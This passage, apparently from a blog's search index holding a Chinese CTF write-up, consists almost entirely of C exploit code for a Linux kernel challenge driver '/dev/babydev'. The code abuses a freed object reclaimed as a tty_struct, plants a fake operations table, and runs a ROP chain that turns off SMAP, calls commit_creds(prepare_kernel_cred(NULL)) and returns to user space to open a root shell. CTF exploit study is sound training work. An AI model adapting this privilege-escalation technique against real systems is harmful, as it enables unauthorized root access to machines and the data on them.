operator">*</span>prepare_kernel_cred<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token operator">=</span> prepare_kernel_cred_addr<span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token punctuation">(</span><span class="token operator">*</span>commit_creds<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token operator">=</span> commit_creds_addr<span class="token punctuation">;</span><span class="token punctuation">(</span><span class="token operator">*</span>commit_creds<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">*</span>prepare_kernel_cred<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>envp<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">signal</span><span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token class-name">size_t</span><span class="token punctuation">)</span>getRootShell<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">saveStatus</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">/*fd2 control tty_struct*/</span><span class="token keyword">int</span> fd1 <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/dev/babydev"</span><span class="token punctuation">,</span> O_RDWR<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>fd1<span class="token operator">&lt;</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">errExit</span><span class="token punctuation">(</span><span class="token string">"Failed to open fd1!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> fd2 <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/dev/babydev"</span><span class="token punctuation">,</span> O_RDWR<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>fd2<span class="token operator">&lt;</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">errExit</span><span class="token punctuation">(</span><span class="token string">"Failed to open fd2!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">ioctl</span><span class="token punctuation">(</span>fd1<span class="token punctuation">,</span> <span class="token number">0x10001</span><span class="token punctuation">,</span> <span class="token number">0x2e0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">close</span><span class="token punctuation">(</span>fd1<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">int</span> tty_fd <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/dev/ptmx"</span><span class="token punctuation">,</span> O_RDWR<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>tty_fd<span class="token operator">&lt;</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">errExit</span><span class="token punctuation">(</span><span class="token string">"Failed to open tty_fd!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token class-name">size_t</span> rop<span class="token punctuation">[</span><span class="token number">0x100</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> i <span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token comment">/*bypass SMAP*/</span>rop<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>POP_RDI_RET<span class="token punctuation">;</span>rop<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0x6f0</span><span class="token punctuation">;</span>rop<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>MOV_CR4_RDI_POP_RBP_RET<span class="token punctuation">;</span>rop<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token comment">/*getroot*/</span>rop<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token class-name">size_t</span><span class="token punctuation">)</span>getRootRrivilege<span class="token punctuation">;</span>rop<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>SWAPGS_POP_RBP_RET<span class="token punctuation">;</span>rop<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>rop<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>IRETQ_RET<span class="token punctuation">;</span>rop<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token class-name">size_t</span><span class="token punctuation">)</span>getRootShell<span class="token punctuation">;</span>rop<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>user_cs<span class="token punctuation">;</span>rop<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>user_rflags<span class="token punctuation">;</span>rop<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>user_sp<span class="token punctuation">;</span>rop<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>user_ss<span class="token punctuation">;</span><span class="token class-name">size_t</span> fake_tty_struct<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token number">0</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token class-name">size_t</span> fake_ops<span class="token punctuation">[</span><span class="token number">0x20</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token number">0</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token function">read</span><span class="token punctuation">(</span>fd2<span class="token punctuation">,</span> fake_tty_struct<span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">)</span><span class="token punctuation">;</span>fake_tty_struct<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">=</span>fake_ops<span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[*] fake_ops_addr: %p\n"</span><span class="token punctuation">,</span> fake_ops<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">write</span><span class="token punctuation">(</span>fd2<span class="token punctuation">,</span> fake_tty_struct<span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">)</span><span class="token punctuation">;</span>fake_ops<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span> <span class="token operator">=</span> MOV_RSP_RAX_DEC_EBX_RET <span class="token punctuation">;</span>fake_ops<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> POP_RSP_RET<span class="token punctuation">;</span>fake_ops<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> rop<span class="token punctuation">;</span><span class="token function">write</span><span class="token punctuation">(</span>tty_fd<span class="token punctuation">,</span> <span class="token string">"X1NRI"</span><span class="token punctuation">,</span> <span class="token number">0x5</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/Binary_FILE/77c08f8025a05cc5889087ab9e9031bb_MD5.jpeg"></p>]]></content>
      
      
      <categories>
          
          <category> èµ›é¢˜ </category>
          
      </categories>
      
      
    </entry>
    
    
  
  
</search>
